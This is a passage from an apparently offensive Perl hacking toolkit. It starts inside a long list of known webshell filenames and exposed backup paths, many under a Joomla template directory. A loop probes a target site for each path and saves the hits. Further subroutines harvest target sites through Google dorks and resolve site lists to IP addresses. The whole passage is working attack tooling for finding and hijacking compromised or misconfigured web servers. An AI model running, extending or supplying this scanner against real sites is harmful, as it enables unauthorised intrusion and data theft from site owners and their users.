'/includes//error',
'/includes//cpanel',
'/includes//awstats',
'/includes//site.sql',
'/includes//vb.sql',
'/includes//forum.sql',
'/includes/r00t-s3c.php',
'/includes/c.php',
'/includes//backup.sql',
'/includes//back.sql',
'/includes//data.sql',
'/includes/wp.rar/',
'/includes/asp.aspx',
'/includes/tmp/vaga.php',
'/includes/tmp/killer.php',
'/includes/whmcs.php',
'/includes/abuhlail.php',
'/includes/tmp/killer.php',
'/includes/tmp/domaine.pl',
'/includes/tmp/domaine.php',
'/includes/useradmin/',
'/includes/tmp/d0maine.php',
'/includes/d0maine.php',
'/includes/tmp/sql.php',
'/includes/X.php',
'/includes/123.php',
'/includes/m.php',
'/includes/b.php',
'/includes/up.php',
'/includes/tmp/dz1.php',
'/includes/dz1.php',
'/includes/forum.rar',
'/includes/Symlink.php',
'/includes/Symlink.pl',
'/includes/forum.rar',
'/includes/joomla.rar',
'/includes/joomla.rar',
'/includes/wp.php',
'/includes/buck.sql',
'/includes/sysadmin.php',
'/includes/images/c99.php',
'/includes/xd.php',
'/xGSx.php',
'/includes/c100.php',
'/includes/spy.aspx',
'/includes/xd.php',
'/includes/tmp/xd.php',
'/includes/sym/root/home/',
'/includes/billing/killer.php',
'/includes/tmp/upload.php',
'/includes/tmp/admin.php',
'/includes/Server.php',
'/includes/tmp/uploads.php',
'/includes/tmp/up.php',
'/includes/Server/',
'/includes/wp-admin/c99.php',
'/includes/tmp/priv8.php',
'/includes/priv8.php',
'/includes/cgi.pl/',
'/includes/tmp/cgi.pl',
'/includes/downloads/dom.php',
'/includes/webadmin.html',
'/includes/admins.php',
'/includes/bluff.php',
'/includes/king.jeen',
'/includes/admins/',
'/includes/admins.asp',
'/includes/admins.php',
'/includes/wp.rar',
'/includes/',
'/templates/rhuk_milkyway/WSO.php',
'/templates/rhuk_milkyway/dz.php',
'/templates/rhuk_milkyway/DZ.php',
'/templates/rhuk_milkyway/cpanel.php',
'/templates/rhuk_milkyway/cpn.php',
'/templates/rhuk_milkyway/sos.php',
'/templates/rhuk_milkyway/term.php',
'/templates/rhuk_milkyway/Sec-War.php',
'/templates/rhuk_milkyway/sql.php',
'/templates/rhuk_milkyway/ssl.php',
'/templates/rhuk_milkyway/mysql.php',
'/templates/rhuk_milkyway/WolF.php',
'/templates/rhuk_milkyway/madspot.php',
'/templates/rhuk_milkyway/Cgishell.pl',
'/templates/rhuk_milkyway/killer.php',
'/templates/rhuk_milkyway/changeall.php',
'/templates/rhuk_milkyway/2.php',
'/templates/rhuk_milkyway/Sh3ll.php',
'/templates/rhuk_milkyway/dz0.php',
'/templates/rhuk_milkyway/dam.php',
'/templates/rhuk_milkyway/user.php',
'/templates/rhuk_milkyway/dom.php',
'/templates/rhuk_milkyway/whmcs.php',
'/templates/rhuk_milkyway/vb.rar',
'/templates/rhuk_milkyway/r00t.php',
'/templates/rhuk_milkyway/c99.php',
'/templates/rhuk_milkyway/gaza.php',
'/templates/rhuk_milkyway/1.php',
'/templates/rhuk_milkyway/d0mains.php',
'/templates/rhuk_milkyway/madspotshell.php',
'/templates/rhuk_milkyway/info.php',
'/templates/rhuk_milkyway/egyshell.php',
'/templates/rhuk_milkyway/Sym.php',
'/templates/rhuk_milkyway/c22.php',
'/templates/rhuk_milkyway/c100.php',
'/templates/rhuk_milkyway/configuration.php',
'/templates/rhuk_milkyway/g.php',
'/templates/rhuk_milkyway/xx.pl',
'/templates/rhuk_milkyway/ls.php',
'/templates/rhuk_milkyway/Cpanel.php',
'/templates/rhuk_milkyway/k.php',
'/templates/rhuk_milkyway/zone-h.php',
'/templates/rhuk_milkyway/tmp/user.php',
'/templates/rhuk_milkyway/tmp/Sym.php',
'/templates/rhuk_milkyway/cp.php',
'/templates/rhuk_milkyway/tmp/madspotshell.php',
'/templates/rhuk_milkyway/tmp/root.php',
'/templates/rhuk_milkyway/tmp/whmcs.php',
'/templates/rhuk_milkyway/tmp/index.php',
'/templates/rhuk_milkyway/tmp/2.php',
'/templates/rhuk_milkyway/tmp/dz.php',
'/templates/rhuk_milkyway/tmp/cpn.php',
'/templates/rhuk_milkyway/tmp/changeall.php',
'/templates/rhuk_milkyway/tmp/Cgishell.pl',
'/templates/rhuk_milkyway/tmp/sql.php',
'/templates/rhuk_milkyway/0day.php',
'/templates/rhuk_milkyway/tmp/admin.php',
'/templates/rhuk_milkyway/L3b.php',
'/templates/rhuk_milkyway/d.php',
'/templates/rhuk_milkyway/tmp/d.php',
'/templates/rhuk_milkyway/tmp/L3b.php',
'/templates/rhuk_milkyway/sado.php',
'/templates/rhuk_milkyway/admin1.php',
'/templates/rhuk_milkyway/upload.php',
'/templates/rhuk_milkyway/up.php',
'/templates/rhuk_milkyway/vb.rar',
'/templates/rhuk_milkyway/vb.rar',
'/templates/rhuk_milkyway/admin2.asp',
'/templates/rhuk_milkyway/uploads.php',
'/templates/rhuk_milkyway/sa.php',
'/templates/rhuk_milkyway/sysadmins/',
'/templates/rhuk_milkyway/admin1/',
'/templates/rhuk_milkyway/sniper.php',
'/templates/rhuk_milkyway/images/Sym.php',
'/templates/rhuk_milkyway//r57.php',
'/templates/rhuk_milkyway/gzaa_spysl',
'/templates/rhuk_milkyway/sql-new.php',
'/templates/rhuk_milkyway//shell.php',
'/templates/rhuk_milkyway//sa.php',
'/templates/rhuk_milkyway//admin.php',
'/templates/rhuk_milkyway//sa2.php',
'/templates/rhuk_milkyway//2.php',
'/templates/rhuk_milkyway//gaza.php',
'/templates/rhuk_milkyway//up.php',
'/templates/rhuk_milkyway//upload.php',
'/templates/rhuk_milkyway//uploads.php',
'/templates/rhuk_milkyway/shell.php',
'/templates/rhuk_milkyway//amad.php',
'/templates/rhuk_milkyway//t00.php',
'/templates/rhuk_milkyway//dz.php',
'/templates/rhuk_milkyway//site.rar',
'/templates/rhuk_milkyway//Black.php',
'/templates/rhuk_milkyway//site.tar.gz',
'/templates/rhuk_milkyway//home.rar',
'/templates/rhuk_milkyway//home.rar',
'/templates/rhuk_milkyway//home.tar',
'/templates/rhuk_milkyway//home.tar.gz',
'/templates/rhuk_milkyway//forum.rar',
'/templates/rhuk_milkyway//forum.rar',
'/templates/rhuk_milkyway//forum.tar',
'/templates/rhuk_milkyway//forum.tar.gz',
'/templates/rhuk_milkyway//test.txt',
'/templates/rhuk_milkyway//ftp.txt',
'/templates/rhuk_milkyway//user.txt',
'/templates/rhuk_milkyway//site.txt',
'/templates/rhuk_milkyway//error_log',
'/templates/rhuk_milkyway//error',
'/templates/rhuk_milkyway//cpanel',
'/templates/rhuk_milkyway//awstats',
'/templates/rhuk_milkyway//site.sql',
'/templates/rhuk_milkyway//vb.sql',
'/templates/rhuk_milkyway//forum.sql',
'/templates/rhuk_milkyway/r00t-s3c.php',
'/templates/rhuk_milkyway/c.php',
'/templates/rhuk_milkyway//backup.sql',
'/templates/rhuk_milkyway//back.sql',
'/templates/rhuk_milkyway//data.sql',
'/templates/rhuk_milkyway/wp.rar/',
'/templates/rhuk_milkyway/asp.aspx',
'/templates/rhuk_milkyway/tmp/vaga.php',
'/templates/rhuk_milkyway/tmp/killer.php',
'/templates/rhuk_milkyway/whmcs.php',
'/templates/rhuk_milkyway/abuhlail.php',
'/templates/rhuk_milkyway/tmp/killer.php',
'/templates/rhuk_milkyway/tmp/domaine.pl',
'/templates/rhuk_milkyway/tmp/domaine.php',
'/templates/rhuk_milkyway/useradmin/',
'/templates/rhuk_milkyway/tmp/d0maine.php',
'/templates/rhuk_milkyway/d0maine.php',
'/templates/rhuk_milkyway/tmp/sql.php',
'/templates/rhuk_milkyway/X.php',
'/templates/rhuk_milkyway/123.php',
'/templates/rhuk_milkyway/m.php',
'/templates/rhuk_milkyway/b.php',
'/templates/rhuk_milkyway/up.php',
'/templates/rhuk_milkyway/tmp/dz1.php',
'/templates/rhuk_milkyway/dz1.php',
'/templates/rhuk_milkyway/forum.rar',
'/templates/rhuk_milkyway/Symlink.php',
'/templates/rhuk_milkyway/Symlink.pl',
'/templates/rhuk_milkyway/forum.rar',
'/templates/rhuk_milkyway/joomla.rar',
'/templates/rhuk_milkyway/joomla.rar',
'/templates/rhuk_milkyway/wp.php',
'/templates/rhuk_milkyway/buck.sql',
'/templates/rhuk_milkyway/sysadmin.php',
'/templates/rhuk_milkyway/images/c99.php',
'/templates/rhuk_milkyway/xd.php',
'/templates/rhuk_milkyway/c100.php',
'/templates/rhuk_milkyway/spy.aspx',
'/templates/rhuk_milkyway/xd.php',
'/templates/rhuk_milkyway/tmp/xd.php',
'/templates/rhuk_milkyway/sym/root/home/',
'/templates/rhuk_milkyway/billing/killer.php',
'/templates/rhuk_milkyway/tmp/upload.php',
'/templates/rhuk_milkyway/tmp/admin.php',
'/templates/rhuk_milkyway/Server.php',
'/templates/rhuk_milkyway/tmp/uploads.php',
'/templates/rhuk_milkyway/tmp/up.php',
'/templates/rhuk_milkyway/Server/',
'/templates/rhuk_milkyway/wp-admin/c99.php',
'/templates/rhuk_milkyway/tmp/priv8.php',
'/templates/rhuk_milkyway/priv8.php',
'/templates/rhuk_milkyway/cgi.pl/',
'/templates/rhuk_milkyway/tmp/cgi.pl',
'/templates/rhuk_milkyway/downloads/dom.php',
'/templates/rhuk_milkyway/webadmin.html',
'/templates/rhuk_milkyway/admins.php',
'/templates/rhuk_milkyway/bluff.php',
'/templates/rhuk_milkyway/king.jeen',
'/templates/rhuk_milkyway/admins/',
'/templates/rhuk_milkyway/admins.asp',
'/templates/rhuk_milkyway/admins.php',
'/templates/rhuk_milkyway/wp.rar',
'/templates/rhuk_milkyway/','WSO.php',
'a.php',
'z.php',
'e.php',
'r.php',
'xz.php',
'hhh.php',
'fuck.php',
'hb.php',
't.php',
'y.php',
'u.php',
'i.php',
'o.php',
'p.php',
'q.php',
's.php',
'd.php',
'f.php',
'g.php',
'h.php',
'j.php',
'k.php',
'l.php',
'm.php',
'w.php',
'x.php',
'c.php',
'v.php',
'b.php',
'n.php',
'1.php',
'2.php',
'3.php',
'4.php',
'5.php',
'6.php',
'7.php',
'8.php',
'9.php',
'10.php',
'12.php',
'11.php',
'1234.php',);

foreach $shell(@path){

$url = $site.$shell;
$req = HTTP::Request->new(GET=>$url);
$useragent = LWP::UserAgent->new();

$response = $useragent->request($req);

if ($response->is_success){
print color("bold Green"),("[Webshell Found] ==> $url  \n");
open(TEXT, '>>Result/shellfound.txt');
   print TEXT "$url\n";  
   close(TEXT);
}else{
print color("bold red"),("[Webshell Not Found] ==> $shell\n");
}
}
exit;
}








sub grabsitedork {
print color 'reset';
print color("bold Green"), "\n";
print "                      ";
print color("bold red"),"[+] Grab Site From Google By Dork [+]\n";
print color 'reset';
print color("bold Green"), "\n";

$au = LWP::UserAgent->new();
$au->agent("Mozilla/5.0 (X11; U; Linux i686; en-US; rv:0.9.3) Gecko/20010801");
$au->timeout(10);

print color("bold Green"),"Dork: ";
$dork=<STDIN>;
chomp $dork;
print color("yellow"), "\n";

for (my $i=1; $i<=2000; $i+=10) {
$url = "https://www.google.com/search?q=$dork&start=".$i;
$content = $au->request(HTTP::Request->new(GET => $url));
$request = $content->content;
while($request =~ m/http:\/\/(.*?)\//g){
$link = $1;
if ($link !~ /overture|msn|live|bing|yahoo|duckduckgo|google|w3|microsof/)
	{
if ($link !~ /^http:/)
	{
	$link = 'http://' . "$link" . '/';
	}
if( $link !~ /\"|\?|\=|index\.php/){
	if  (!  grep (/$link/,@result))
					{
print "$link\n";
open(TEXT, '>>Grab site[dork].txt');
    print TEXT "$link\n";
    close(TEXT);
	push(@result,$link);
}
} 
}
}
}
}
sub listtoip() {
print color("bold red"),"\n Enter List Sites : ";
$opn=<STDIN>;
chomp $opn;

open(tarrget,"$opn") or die "$!";
while(<tarrget>){
chomp($_);
$target = $_;
close(FILE);
 
# For each hostname, fetch the IP address
foreach $hostname ($target) {
   chomp($hostname);
   if($hostname) {
      $ip = gethostbyname($hostname);
      if($ip) {
        
		print "\n" , $hostname."==>".inet_ntoa($ip);
		
		open (TEXT, '>>Result/list-to-Ip.txt');
print TEXT "\n" , "".inet_ntoa($ip);
undef $ip;
close (TEXT);       
}else {
        # Print 0.0.0.0 for unresolved Hostnames
        printf "%sn\n" , $hostname.":0.0.0.0";
        undef $ip;
      }
   }
}
}
exit
}
sub ipgen(){
print " Enter your websites list:";
my $list=<STDIN>;
chomp($list);

open (THETARGET, "<$list") || die "Not Found";
@TARGETS = <THETARGET>;
close THETARGET;
$link=$#TARGETS + 1;



OUTER: foreach $Ip(@TARGETS){
chomp($Ip);
if($Ip =~ /http:\/\/(.*)\//) {
$Ip= $1;
gett();

}else{
gett();
open(TEXT, '>>Result/Generator.txt');
   print TEXT "$list\n";  
   close(TEXT);
}
}
}





